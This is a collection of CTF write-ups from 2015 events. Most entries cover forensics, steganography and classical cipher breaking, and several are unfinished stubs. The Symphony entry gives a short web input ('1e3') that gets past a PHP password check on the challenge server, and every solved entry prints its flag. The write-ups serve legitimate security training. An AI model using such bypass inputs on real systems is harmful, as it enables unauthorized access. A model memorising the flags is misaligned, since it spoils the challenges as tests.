 98 0.150447000          1.0 -> host         USB  GET DESCRIPTOR Response DEVICE
```
Note that USB device address 1.0 has three different descriptor packets.  This probably means we are looking at multiple busses.
```
$ tshark -r challenge.pcapng usb.bDescriptorType and usb.urb_type==67 -T fields -e usb.bus_id -e usb.device_address -e usb.idVendor -e usb.idProduct
2       12      0x046d  0xc00e
3       1       0x1d6b  0x0003
1       2       0x8087  0x8000
1       1       0x1d6b  0x0002
2       3       0x5986  0x0268
2       2       0x8087  0x07dc
2       1       0x1d6b  0x0002
```
Search Google for these vid:pid pairs to identify what we are looking at.  Based on the info above, lsusb on the target system would probably look approximately like this:
```
Bus 002 Device 012: ID 046d:c00e Logitech M-BJ58/M-BJ69 Optical Wheel Mouse
Bus 003 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub
Bus 001 Device 002: ID 8087:8000 Intel Integrated Rate Matching Hub
Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
Bus 002 Device 003: ID 5986:0268 Acer Integrated Camera
Bus 002 Device 002: ID 8087:07dc Intel 7260AC Bluetooth
Bus 002 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
```
What devices are actually sending data?
```
$ tshark -r challenge.pcapng 'usb.data_flag=="present (0)"' -T fields -e usb.bus_id -e usb.device_address -e usb.endpoint_number.endpoint | sort | uniq -c
     12 1       1       0
      2 1       1       1
     12 1       2       0
      1 1       2       1
      7 2       1       0
      1 2       1       1
      1 2       12      0
   7608 2       12      1
      1 2       2       0
      3 2       3       0
      9 3       1       0
      1 3       1       1
```
So other than a few packets from the hubs, it is really only bus:1 dev:12.1 that is talking.  The Logitech mouse?  Ewww.  What does mouse data look like, anyway?
```
$ tshark -r challenge.pcapng usb.capdata and usb.device_address==12 -T fields -e usb.capdata > mouse_data.txt
$ head mouse_data.txt
00:01:00:00
00:01:00:00
00:01:00:00
00:01:00:00
00:01:00:00
00:02:00:00
00:02:ff:00
00:02:00:00
00:03:ff:00
00:01:00:00
```
Hmm.  What does mouse data usually look like?  Here is some [quick usb-mouse code](http://johnroach.info/2011/02/16/getting-raw-data-from-a-usb-mouse-in-linux-using-python/) to run while wiggling around a mouse.  If I run this and move my mouse up one pixel, right, down, left then click, I get this output:
```
0x8 0 1
0x8 1 0
0x28 0 -1
0x18 -1 0
0x9 0 0
0x8 0 0
```
Looks like the status byte passes click info.  The next value is signed relative X movement, and the last is signed relative Y movement.  Look back at the captured data and see if it is similar.
```
$ sed -n 7597,7604p mouse_data.txt
00:f4:02:00
00:f4:01:00
00:f4:00:00
00:f5:00:00
00:f5:ff:00
00:f5:00:00
00:f6:ff:00
00:f7:ff:00
```
That section looks pretty good for 8-bit two's compliment X and Y values in the middle.  Do the first or last values change?
```
$ awk -F: '{print$1}' mouse_data.txt | sort | uniq -c
   7518 00
     90 01
$ awk -F: '{print$4}' mouse_data.txt | sort | uniq -c
   7608 00
```
First value has two states, but the last value is always 0x00.  So maybe we have 90 clicks?  Time to start summing relative movement and printing values on click events.
```
$ awk -F: 'function comp(v){if(v>127)v-=256;return v}{x+=comp(strtonum("0x"$2));y+=comp(strtonum("0x"$3))}$1=="01"{print x,y}' mouse_data.txt | tee click_coordinates.txt | head -5
460 -286
586 -203
289 -288
567 -31
117 -291
$ gnuplot -e "plot 'click_coordinates.txt'"
```
![Image of Gnuplot coordinate plot](coordinates_plot.png)

Sure enough, that looks like a keyboard with a spacebar up at the top.  Why is the keyboard upside down, you ask?  Couldn't tell ya.  Let's map those positions to keys!
```
$ awk 'BEGIN{split("          zxcvbnm  asdfghjkl qwertyuiop",key,//)}{r=int(($2-20)/-100);c=int(($1 - 117 + (r % 2 * 40)) / 85);k=r*10+c;printf "%s",key[k]}END{print""}' click_coordinates.txt 
the quick brown fox jumps ovver the lazy dog thekeyisiheardyoulikedsketchyetchingglastyear
```
But something isn't quite right in there.  There are repeating letters in two places that don't make sense.
```
$ grep -C2 01:ff:00:00 mouse_data.txt
00:00:ff:00
01:00:00:00
01:ff:00:00
00:00:00:00
00:01:ff:00
--
00:00:01:00
01:00:00:00
01:ff:00:00
00:00:00:00
00:02:00:00
```
Some sort of click-drag or double-click nonsense.  So just nuke those "bad click" lines and process again...
```
$ tshark -r challenge.pcapng usb.capdata and usb.device_address==12 -T fields -e usb.capdata | grep -v 01:ff:00:00 > mouse_data.txt
$ awk -F: 'function comp(v){if(v>127)v-=256;return v}{x+=comp(strtonum("0x"$2));y+=comp(strtonum("0x"$3))}$1=="01"{print x,y}' mouse_data.txt > click_coordinates.txt
$ awk 'BEGIN{split("          zxcvbnm  asdfghjkl qwertyuiop",key,//)}{r=int(($2-20)/-100);c=int(($1 - 117 + (r % 2 * 40)) / 85);k=r*10+c;printf "%s",key[k]}END{print""}' click_coordinates.txt 
the quick brown fox jumps over the lazy dog thekeyisiheardyoulikedsketchyetchinglastyear
```
If you aren't a fan of decyphering awk, there is an ugly python example for you to re-write.  [usb-mouse_osk_decode.py](usb-mouse_osk_decode.py)

# Samurai's Analog Jujitsu Method
Using a list of mouse movement delta information ([see our coords file](rel_coord_log)) and a slick [python script](plot_coords_py.py) using matplotlib from [@kavefish](https://github.com/kavefish) we get an animated gif of all the mouse clicks:

![Mouse Click Animation](animaion.gif)

And with a quick scotch tape and marker job, you can easily decode it:

![Analog Jujitsu](Missy.jpg)

## Other write-ups and resources

* <http://blog.dragonsector.pl/2015/03/boston-key-party-2014-riverside.html>
* <https://johnsupercool.github.io/posts/2015/mars/01/boston-key-party-2015-ctf-misc200-riverside/>
* <http://u.osu.edu/romig.1/2015/03/02/boston-key-party-riverside-write-up/>
* <https://github.com/cesena/writeups/tree/master/ctfs/boston%20key%20party-2015/riverside>
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-riverside.html)
# Boston Key Party CTF 2015: Symphony

**Category:** School-Bus
**Points:** 25
**Solves:** 577
**Description:**

> A less than four characters number, bigger than 999?Maybe the bug is elsewhere. : 25

## Write-up

by [oyearunpal](https://github.com/oyearunpal) and [polym](https://github.com/abpolym)

Given the [php source code](./52.10.107.64\:8002/index.txt), we see that we need an input that is less than 3 chars and get beyond `is_numeric`.

The solution to this problem is using float numbers, e.g. `http://52.10.107.64:8002/?password=1e3`.

The flag is `B4SE10_IS_F0R_LOSERS`.

## Other write-ups and resources

* <http://dook.biz/2015/03/boston-key-party-ctf-symphony-writeup/>
* <https://github.com/bl4de/ctf/blob/master/BostonKeyPartyCTF_2015/Symphony.md>
* <https://ctf-team.vulnhub.com/boston-key-party-2015-symphony/>
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-symphony.html)
# BreakIn CTF 2015: Numbero

**Category:** Crypto
**Points:** 100
**Description:**

> 31142523534214211345314255431421214254521253345221

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# BreakIn CTF 2015: Substitution

**Category:** Crypto
**Points:** 200
**Description:**

> Sub-sti-tut-ion
>
> ZjAtmjtgIeisfzgzgwzbsjYntxsmmtnRtdgDsgnoPnecdjtxDzniznwUgeisnmejo.YntxsmmtnPnecdjegiejswIeisfzgzgwzjtceiszvsqjunszjjdsUgeisnmejo.ZxjsnasegczqhuzegjswpejdIeisfzgzgwz'mfgtpvswcs,pemwtbzgwskqsvvsgqsYntxsmmtnPnecdjegmemjswdebjtnsynsmsgjDegwuembzjjdsYznvezbsgjtxPtnvw'mNsvecetgm.PdsgPnecdjvszngswjdzjIeisfzgzgwzpzmgtjtxxeqezvvozqqnswejswzgwwewgtjdziszgoqnswsgjzevjtrtegjdsYznvezbsgj,dsjtvwIeisfzgzgwzJtzmfxtnotunqnswsgjezvmemvefszmfegcjdsmugjtmjzjsejmnecdjjtmdegsegjdsdszisgm.Jdsxvzcem qvzmmeqzvqnoyjtnuvslbtwsngqnoyjt

## Write-up

by [polym](https://github.com/abpolym)

As the description hints, we need to substitute letters with a substitute cipher.

Using these tools ([1](http://www.richkni.co.uk/php/crypta/freq.php), [2](http://crypto.interactive-maths.com/frequency-analysis-breaking-the-code.html), [3](http://www.counton.org/explorer/codebreaking/frequency-analysis.php), [4]()), we can conduct a frequency analysis:

![](frequency.png)

In addition to that, we can use [n-gram analysis](http://www.cryptool-online.org/index.php?option=com_cto&view=tool&Itemid=113&lang=en) to determine the most common bigram/trigrams and [double letters](http://crypto.interactive-maths.com/frequency-analysis-breaking-the-code.html).

The rough procedure is as follows:

* The ciphertext is
>	ZjAtmjtgIeisfzgzgwzbsjYntxsmmtnRtdgDsgnoPnecdjtxDzniznwUgeisnmejo.
>	YntxsmmtnPnecdjegiejswIeisfzgzgwzjtceiszvsqjunszjjdsUgeisnmejo.
>	ZxjsnasegczqhuzegjswpejdIeisfzgzgwz'mfgtpvswcs,
>	pemwtbzgwskqsvvsgqsYntxsmmtnPnecdjegmemjswdebjtnsynsmsgjDegwuembzjjdsYznvezbsgjtxPtnvw'mNsvecetgm.
>	PdsgPnecdjvszngswjdzjIeisfzgzgwzpzmgtjtxxeqezvvozqqnswejswzgwwewgtjdziszgoqnswsgjzevjtrtegjdsYznvezbsgj,
>	dsjtvwIeisfzgzgwzJtzmfxtnotunqnswsgjezvmemvefszmfegcjdsmugjtmjzjsejmnecdjjtmdegsegjdsdszisgm.
>	Jdsxvzcem
>	qvzmmeqzvqnoyjtnuvslbtwsngqnoyjt

* Substituting the first three most common letters `S`->`E`, `J`->`T` and `Z`->`A` yields

![](step1.png)

* We know that the words trigram `the` and `and` are very common in the English language, so we try to find two trigrams in the ciphertext that do not contain letters of the other. We conclude that `jds` and `zgw` are possible candidates.

![](step2.png)

* After that, we try to have a take at the double letters. The most common letters in the English alphabet and in this ciphertext are

![](doubles.png)

* We are substituting `M`->`S`, as well as `V`->`L` and `X` ->`F`:

![](step3.png)

* We now can guess possible words, e.g. `Afte.` could mean `After`, `hea.en` could mean `heaven` and `thefla..s` could definitely mean `theflagis`. So we substitute these letters:

![](step4.png)

* After repeating the previous step, we see that the resulting substitution is:

![](substitutions.png)

* The cleartext is:

![](cleartext.png)

Flag is `CLASSICALCRYPTORULEZMODERNCRYPTO`.

## Other write-ups and resources

* none yet
# BreakIn CTF 2015: Cheaters

**Category:** Forensics
**Points:** 400
**Description:**

> An admin finds out that a team is cheating in a ctf by asking answers for questions.Could you help me prove the cheating.
>
> [Dowload Link (am i secure.tar)](am i secure.tar)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# BreakIn CTF 2015: Investigator

**Category:** Forensics
**Points:** 500
**Description:**

> Our forensic investigator had successfully hacked into maybsecurities facebook account.Well itseems that he grabbed some interesting links and i believe that he found some pictures and was stuck solving it.He sent me a pcap before he was murdered.Could you find the information ?
>
> [Dowload Link (maybsecurities1.pcap.pcapng)](maybsecurities1.pcap.pcapng)
>
> Flagformat:flag<string>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# BreakIn CTF 2015: Serial Killer

**Category:** Forensics
**Points:** 300
**Description:**

> Police has gotten hold of computer of a serial killer. He managed to delete most of his user data, but they were hopeful that they may still be able to track him down and they actually did predict the exact location and time of his next strike and stopped him. Now they use this challenge for recruitment. You are given the exact same data you have to tell what was the planned place and time of the killer's strike.
>
> The answer format : flag{date,lat,log}
>
> date -> dd:mm:yyyy
>
> lat long should be till 6 decimal places.
>
> Example : flag{01:01:0101,01.010101,01.010101}
>
> [Dowload Link (SerialKillerInvestigation.tar.gz)](SerialKillerInvestigation.tar.gz)

## Write-up

by [polym](https://github.com/abpolym)

First, we extract the gzip-compressed archive using `tar xzvf SerialKillerInvestigation.tar.gz` and see that it contains a home directory of the user `berch`:

```bash
$ ls -al berch
drwx------@ 19 XXX  wheel  646 Feb 14 16:44 ./
drwxr-xr-x   4 XXX  wheel  136 Feb 16 01:55 ../
-rw-------@  1 XXX  wheel  632 Feb 14 14:05 .ICEauthority
drwx------@  3 XXX  wheel  102 Feb 14 14:14 .adobe/
-rw-------@  1 XXX  wheel   61 Feb 14 14:07 .bash_history
-rw-r--r--@  1 XXX  wheel   21 Aug 25  2013 .bash_logout
-rw-r--r--@  1 XXX  wheel   57 Aug 25  2013 .bash_profile
-rw-r--r--@  1 XXX  wheel  141 Aug 25  2013 .bashrc
drwxr-xr-x@  9 XXX  wheel  306 Feb 14 14:08 .config/
drwx------@  3 XXX  wheel  102 Feb 14 13:55 .dbus/
-rw-------@  1 XXX  wheel   16 Feb 14 13:55 .esd_auth
drwx------@  3 XXX  wheel  102 Feb 14 13:55 .local/
drwx------@  3 XXX  wheel  102 Feb 14 14:14 .macromedia/
drwx------@  4 XXX  wheel  136 Feb 14 14:06 .mozilla/
-rw-------@  1 XXX  wheel   34 Feb 14 16:38 .sqlite_history
-rw-r--r--@  1 XXX  wheel  312 Dec  9  2013 .xinitrc
-rw-r--r--@  1 XXX  wheel  100 Dec  9  2013 .xsession
drwxr-xr-x@  2 XXX  wheel   68 Feb 14 14:06 Desktop/
drwx------@  8 XXX  wheel  272 Feb 14 16:17 Downloads/
```

We have a look inside the `.bash_history` as well as the `.sqlite_history`:

```bash
$ cat .bash_history
ls -a
cd .mozilla/
ls
cd firefox/
ls
cd ot9rmdnk.default/
ls
$ cat .sqlite_history
.tables
select * from moz_places;
```

So this hints that we have to look at the mozilla `places.sqlite` SQLite3 Databse, with `moz\_places` being a table in this db. Let's `cd` to it and have a look at the different tables:

```bash
$ cd .mozilla/firefox/ot9rmdnk.default/
$ sqlite3 places.sqlite <<< '.tables'
moz_anno_attributes  moz_favicons         moz_items_annos
moz_annos            moz_historyvisits    moz_keywords
moz_bookmarks        moz_hosts            moz_places
moz_bookmarks_roots  moz_inputhistory
```

Now, let's repeat the sqlite command from the `.sqlite\_history` file and see what we get:

```bash
$ sqlite3 -cmd '.headers ON' places.sqlite <<< 'select * from moz_places;'
id|url|title|rev_host|visit_count|hidden|typed|favicon_id|frecency|last_visit_date|guid
1|https://www.mozilla.org/en-US/firefox/central/||gro.allizom.www.|0|0|0||137||QO-VikH8PZr4
2|https://www.mozilla.org/en-US/firefox/help/||gro.allizom.www.|0|0|0|1|137||23iTj4UgMd3y
3|https://www.mozilla.org/en-US/firefox/customize/||gro.allizom.www.|0|0|0|2|137||EVOErRlfgYg4
[...]
612|https://www.google.co.in/search?q=goa&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a&channel=sb&gfe_rd=cr&ei=mmvfVJTjNcqW8Qf8sYD4BA|goa - Google Search|ni.oc.elgoog.www.|1|0|0|5|100|1423928169572529|9WDI9q2mHAdt
613|https://www.google.com/search?q=police+nehind+where+to+hide+hyderabad&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a&channel=sb||moc.elgoog.www.|1|1|0||100|1423928194103894|gWWrougtKwcc
614|https://www.google.co.in/search?q=police+nehind+where+to+hide+hyderabad&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a&channel=sb&gfe_rd=cr&ei=s2vfVP-6H8qW8Qf8sYD4BA|police nehind where to hide hyderabad - Google Search|ni.oc.elgoog.www.|1|0|0|5|100|1423928194227435|yz-yHoVFmY8u
615|https://www.google.co.in/search?q=police+nehind+where+to+hide+hyderabad&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a&channel=sb&gfe_rd=cr&ei=s2vfVP-6H8qW8Qf8sYD4BA#rls=org.mozilla:en-US:official&channel=sb&q=hiding+place+hyderbad|hiding place hyderbad - Google Search|ni.oc.elgoog.www.|1|0|0|5|100|1423928217992935|5Ha-sjjfh6Ey
```

Well, these google search entries look promising, let's select all titles that indicate what the user searched for:

```bash
$ sqlite3 -cmd '.headers ON' places.sqlite <<< 'select id,title from moz_places;'
id|title
1|
2|
[...]
604|security conferences india - Google Search
605|
606|Asian Security Conference 2015
607|Asian Security Conference 2015
608|cyber security conferences in india - Google Search
609|cyber security conferences in india 2015 - Google Search
610|
611|
612|goa - Google Search
613|
614|police nehind where to hide hyderabad - Google Search
615|hiding place hyderbad - Google Search
```

So his last searches were where to hide in hyderabad, india and some security conferences. Besides that, he downloaded and searched for visa application forms, which are located at `berch/Downloads`.

At this stage, we might think that he wants to assassinate someone at a conference, e.g. the nullcon/goa conference in India, which the last searches suggest.

If we `grep` the db entries for nullcon or goa, we get
```bash
$ sqlite3 places.sqlite <<< 'select * from moz_places;' | grep -iE '(nullcon|goa)'
81|https://www.google.co.in/maps/@52.5574402,31.4575282,7z|nullcon - Google Maps|ni.oc.elgoog.www.|1|0|0|15|100|1423920465333719|YSh-eoywAoBV
82|https://www.google.co.in/maps/search/nullcon/@52.5574402,31.4575282,7z|defcon - Google Maps|ni.oc.elgoog.www.|1|0|0|15|100|1423920466511530|surdFuuZ90Ac
590|https://www.google.com/search?q=nullcon&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a&channel=sb||moc.elgoog.www.|1|1|0||100|1423928033306733|sL2qujRDPqLX
594|http://nullcon.net/||ten.nocllun.|1|1|0||100|1423928045857218|NV1E1o5TCVrB
595|http://nullcon.net/website||ten.nocllun.|1|1|0||100|1423928046127594|B-ETEgLc1tzl
611|https://www.google.com/search?q=goa&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a&channel=sb||moc.elgoog.www.|1|1|0||100|1423928169451852|Z7zFZBZie6SM
612|https://www.google.co.in/search?q=goa&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a&channel=sb&gfe_rd=cr&ei=mmvfVJTjNcqW8Qf8sYD4BA|goa - Google Search|ni.oc.elgoog.www.|1|0|0|5|100|1423928169572529|9WDI9q2mHAdt
```

We see some google map searches with their respective latitude/longitude coordinates (right after the `@` symbol), but these do not point anywhere near India.

So we manually search for the location of the nullcon conference, which happens to be the location of last years nullcon conference - [The Bogmallo Beach Resort](https://www.google.de/maps/place/Bogmallo+Beach+Resort/@15.368603,73.835396,15z).

Having in mind (by visiting the [nullcon website](http://nullcon.net/website/)) that the conference is scheduled for 4 days...

![](dates.png)

...we try every date combination and finally get the flag `flag{05:02:2015,15.368603,73.835396}`.

## Other write-ups and resources

* none yet
# BreakIn CTF 2015: StrangeImage

**Category:** Forensics
**Points:** 200
**Description:**

> Gotcha !! [this](stego_200.jpeg) is the image my friend told me that there was something hidden inside..He saw a very strange things in this.Could you temme what information is hidden inside so that i can prove that my friend was right about it ?

## Write-up

by [polym](https://github.com/abpolym)

We are given a JPG:

![](./stego_200.jpeg)

Using `binwalk`, we see that inside this JPEG someone hid a rar archive:

```bash
$ binwalk stego_200.jpeg | grep -v Zlib
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 703 x 1056, 8-bit/color RGBA, non-interlaced
24644         0x6044          LZMA compressed data, properties: 0x5D, dictionary size: 2097152 bytes, missing uncompressed size
353868        0x5664C         RAR archive data
$ foremost stego_200.jpeg 
Processing: stego_200.jpeg
|*|
$ tree output
output
├── audit.txt
├── png
│   └── 00000000.png
└── rar
    └── 00000691.rar

2 directories, 3 files
$  unrar x 00000691.rar 

UNRAR 5.21 freeware      Copyright (c) 1993-2015 Alexander Roshal


Extracting from 00000691.rar

Extracting  I am useless                                              OK 
Extracting  stego_200.jpeg                                            OK 
Extracting  do_not_open_me.txt                                        OK 
Extracting  Steganography.pdf                                         OK 
Extracting  qrcode.rar                                                OK 
All OK
$ file *
00000691.rar:       RAR archive data, v1d, os: Win32
I am useless:       PNG image data, 280 x 280, 8-bit/color RGBA, non-interlaced
Steganography.pdf:  PDF document, version 1.4
do_not_open_me.txt: ASCII English text, with CRLF line terminators
qrcode.rar:         RAR archive data, v1d, os: Win32
stego_200.jpeg:     PNG image data, 703 x 1056, 8-bit/color RGBA, non-interlaced
```

The rar archive contains another rar archive, `qrcode.rar`.

We extract it to find several QR codes:

```bash
$ unrar x qrcode.rar 

UNRAR 5.21 freeware      Copyright (c) 1993-2015 Alexander Roshal


Extracting from qrcode.rar

Creating    qrcode                                                    OK
Extracting  qrcode/QR1.png                                            OK 
Extracting  qrcode/QR10.png                                           OK 
Extracting  qrcode/QR11.png                                           OK 
Extracting  qrcode/QR2.png                                            OK 
Extracting  qrcode/QR3.png                                            OK 
Extracting  qrcode/QR4.png                                            OK 
Extracting  qrcode/QR5.png                                            OK 
Extracting  qrcode/QR6.png                                            OK 
Extracting  qrcode/QR7.png                                            OK 
Extracting  qrcode/QR8.png                                            OK 
Extracting  qrcode/QR9.png                                            OK 
All OK
```

However, this - as most other files in the original archive - is a red herring (or rather hint), as can be seen by decoding the QR codes using `zbarimg`:

```bash
$ for i in {1..11}; do zbarimg "QR$i.png"; done
QR-Code:THE
scanned 1 barcode symbols from 1 images in 0 seconds

QR-Code:FLAG
scanned 1 barcode symbols from 1 images in 0 seconds

QR-Code:YOU
scanned 1 barcode symbols from 1 images in 0 seconds

QR-Code:NEED
scanned 1 barcode symbols from 1 images in 0 seconds

QR-Code:FOR
scanned 1 barcode symbols from 1 images in 0 seconds

QR-Code:THIS
scanned 1 barcode symbols from 1 images in 0 seconds

QR-Code:CHALLENGE
scanned 1 barcode symbols from 1 images in 0 seconds

QR-Code:is
scanned 1 barcode symbols from 1 images in 0 seconds

QR-Code:hidden
scanned 1 barcode symbols from 1 images in 0 seconds

QR-Code:in
scanned 1 barcode symbols from 1 images in 0 seconds

QR-Code:I am useless file
scanned 1 barcode symbols from 1 images in 0 seconds
```

It is suggested that the flag is hidden inside `I am useless`, a PNG.

We rename the file accordingly:

```bash
$ mv I\ am\ useless pic.png
```

The PNG is yet another QR code:

![](./pic.png)

However, applying `zbarimg` on this QR code does not reveal a flag, but a hint:

```bash
$ zbarimg pic.png 
QR-Code:Look closer !! you are on the right pa
scanned 1 barcode symbols from 1 images in 0 seconds
```

Using `stegsolve`, we find morse-code in the alpha plane values:

![](./stegsolve.png)

    --.- .-. -- ----- .-. ... ...-- .---- ... ..-. ..- -.

Decoding this morse-code using [an online QR decoder](https://gc.de/gc/morse/), we find the flag, `qrm0rs31sfun`.

## Other write-ups and resources

* <http://0x1337seichi.wordpress.com/2015/02/15/break-in-2015-ctf-strangeimage-writeup-forensic-200/>
# BreakIn CTF 2015: Valentine's Day

**Category:** Forensics
**Points:** 100
**Description:**

> The meaning of love lies within
>
> [Dowload Link (banana.tar.gz)](banana.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# BreakIn CTF 2015: Heisenberg

**Category:** Miscellaneous
**Points:** 200
**Description:**

> Heisenberg's phone is been secretly viewed by his wife and she sees a message from 'YaÃ±ez Sepulveda' and seems to be telling some secret message in an unknown text format.she figures it out that it is not a GZM.Crack it and get him the message.
>
> ciphertext:
>
> GZVBRTKQBKUNKTIKEVQZNZOBKYUNMIJMTDMOKEMZUTAFZNOEFHWVJFQBWQZNNYEEMKTWJVBMDPLOWPLRBKYLNNEVLZTFQLFQLTLLPEWWHWJTPXWCIAJLYLRBLTMKEBLZNLTILEVELPHZLRYELZNMBLCAEVMWLZETFDJEXOWELVWWPAJOR

## Write-up

by [polym](https://github.com/abpolym)

The first thing we do is googling "'Yañez Sepulveda' cipher" to get the below mentioned Origin of the cipher we have to use.

After understanding what the substitute key is, we use [this code](cocaine.py) to substitute the ciphertext letters with the key letters and print out all possible combinations (since numbers and letters share the same cipher keys).

```bash
$ python cocaine.py
X{1,A}G{9,H}{7,K}NEW{9,H}EISEN{8,B}E{4,R}GW{1,A}S{1,A}C{9,H}EMIS{2,T}{8,B}{6,U}{2,T}NO{2,T}CE{4,R}{2,T}{1,A}INLY{1,A}SC{4,R}YP{0,Z}G{6,U}YW{9,H}{0,Z}W{1,A}SSM{4,R}{4,R}{2,T}EN{0,Z}{6,U}G{9,H}{2,T}OD{3,Ñ}C{0,Z}D{3,Ñ}{7,K}{9,H}EM{3,Ñ}SS{4,R}G{3,Ñ}{1,A}NYW{3,Ñ}YW{3,Ñ}N{3,Ñ}{3,Ñ}D{4,R}{0,Z}{0,Z}P{0,Z}{6,U}ND{5,J}{0,Z}F{8,B}L{6,U}{3,Ñ}M{3,Ñ}{7,K}{9,H}{3,Ñ}N{2,T}E{4,R}{9,H}{3,Ñ}{1,A}S{3,Ñ}N{8,B}{3,Ñ}{4,R}G{4,R}{3,Ñ}DP{1,A}{3,Ñ}{7,K}M{4,R}{3,Ñ}{1,A}S{2,T}{9,H}{3,Ñ}FL{4,R}G{2,T}{0,Z}{3,Ñ}{1,A}{4,R}NYO{6,U}{4,R}{5,J}C{0,Z}{4,R}{3,Ñ}G{0,Z}{0,Z}DL{6,U}C{7,K}
```

Now we can either guess words, such as `HEISENBERG` or print all possible combinations using `bash`'s brace expansion ability:

```bash
$ for i in W{1,A}S{1,A}C{9,H}EMIS{2,T}; do echo $i; done
W1S1C9EMIS2
W1S1C9EMIST
W1S1CHEMIS2
W1S1CHEMIST
W1SAC9EMIS2
W1SAC9EMIST
W1SACHEMIS2
W1SACHEMIST
WAS1C9EMIS2
WAS1C9EMIST
WAS1CHEMIS2
WAS1CHEMIST
WASAC9EMIS2
WASAC9EMIST
WASACHEMIS2
WASACHEMIST
```

Note that you should use this brace expansion ability with care, the more combinations are possible, the longer and more power does `bash` need. Only let `bash` expand the string _partially_.

The output is

> X{1,A}G{9,H}{7,K}NEW {9,H}EISEN{8,B}E{4,R}G
>
> X1GH KNEW HEISENBERG 
>
> W{1,A}S{1,A}C{9,H}EMIS{2,T}{8,B}{6,U}{2,T}NO{2,T}CE{4,R}{2,T}{1,A}INLY{1,A}SC{4,R}YP{0,Z}G
>
> WAS A CHEMIST BUT NOT CERTAINLY
>
> {1,A}SC{4,R}YP{0,Z}G{6,U}YW{9,H}{0,Z}W{1,A}SSM{4,R}{4,R}{2,T}EN{0,Z}{6,U}G{9,H}{2,T}OD{3,Ñ}C{0,Z}D{3,Ñ}
>
> AS CRYP0GUY WH0 WAS SM4RT EN0UGH TO D3C0D3
>
> {7,K}{9,H}EM{3,Ñ}SS{4,R}G{3,Ñ}{1,A}NYW{3,Ñ}YW{3,Ñ}N{3,Ñ}{3,Ñ}D
>
> THE M3SS4G3 ANYW3Y W3 N33D
>
> {4,R}{0,Z}{0,Z}P{0,Z}{6,U}ND{5,J}{0,Z}F{8,B}L{6,U}{3,Ñ}M{3,Ñ}{7,K}{9,H}
>
> 400 P0UND5 0F BLU3 M3TH
>
> {3,Ñ}N{2,T}E{4,R}{9,H}{3,Ñ}{1,A}S{3,Ñ}N{8,B}{3,Ñ}{4,R}G
>
> 3NT3R H31S3NB3RG
>
> {4,R}{3,Ñ}DP{1,A}{3,Ñ}{7,K}M{4,R}{3,Ñ}
>
> 4ND P1NKM4N 
>
> {1,A}S{2,T}{9,H}{3,Ñ}FL{4,R}G
>
> AS TH3 FL4G
>
> {2,T}{0,Z}{3,Ñ}{1,A}{4,R}N YO{6,U} {4,R}{5,J}C{0,Z}{4,R}{3,Ñ} G{0,Z}{0,Z}DL{6,U}C{7,K}
>
> T0 3ARN YOU 4 5C0R3 G00D LUCK

Our flag should be `H31S3NB3RG 4ND P1NKM4N`.

## Other write-ups and resources

* [Origin of cipher](http://crypto-tasks.livejournal.com/28226.html)
# BreakIn CTF 2015 write-ups

* <http://felicity.iiit.ac.in/contest/break_in/>
* [Scoreboard](http://felicity.iiit.ac.in/contest/break_in/scoreboard)

## Completed write-ups

* [crypto/substitution](crypto/substitution)
* [forensic/serial_killer](forensic/serial_killer)
* [forensic/strangelmage](forensic/strangelmage)
* [misc/heisenberg](misc/heisenberg)

## External write-ups only

* none yet

## Missing write-ups

* [crypto/numbero](crypto/numbero)
* [forensic/cheaters](forensic/cheaters)
* [forensic/investigator](forensic/investigator)
* [forensic/valentines_day](forensic/valentines_day)
* [reverse/breakingame](reverse/breakingame)
* [reverse/breakit](reverse/breakit)
* [reverse/jaggipalace](reverse/jaggipalace)
* [reverse/regcomp](reverse/regcomp)# BreakIn CTF 2015: BreakInGame

**Category:** Reverse
**Points:** 300
**Description:**

> Break the Game!! Dowload Link [(problem_4)](problem_4)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# BreakIn CTF 2015: BreakIt

**Category:** Reverse
**Points:** 200
**Description:**

> Break It!! Dowload Link [(problem_3)](problem_3)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# BreakIn CTF 2015: JaggiPalace

**Category:** Reverse
**Points:** 400
**Description:**

> Deduct it. Dowload Link [(problem_2)](problem_2)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# BreakIn CTF 2015: RegComp

**Category:** Reverse
**Points:** 400
**Description:**

> Pass it!! Dowload Link [(problem_1)](problem_1)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Vancouver BSides CTF 2015: matasano

**Category:** Crypto
**Points:** 50
**Solves:** 17
**Description:** 

> Keys open doors.
> Keys open doors.
> 
> PwMUFVsbOghWAAcbMU4RHlZSKxwTFAUEF11zDgMTE1sFNgpUTksRLxwAFVsTKh0Q
> Jx9BLlsKLRRCBgcHMEMGF18eOhdDQxsJCBRlFUBBExMcOBIdTkYaO04XF0MCOgFOUB0LFw
> IQkVRxIHfxVZD1NUPh0WWhMDKhoAX1IDBQ50SkwNDhAMfzNQA0YQPgA
> LxhGFFsdNwBFTlUVL04VHlYcMB4GWh0LRDlvCEwlBh8Ic0FXG0Qffz4KBkMT
> PwMURxwGK0FFAQcXPgIJVl4XfzURVRwGDQ4gK0IpSVs+NwhFCw
> LwIVBhAMfw1YCU8AfxoKHVYBc1MXWwYARBRyCQI
> MQ0SRw8GMwURB0lULAYKGUcdKgcQGFIWEBx5RgAOEFsIMQURBUIRL04DH0EbMVQ
> LQkEF1sMJxVDDwcXMwcVBRMUMAFDUQoRFhwgFQQIEw
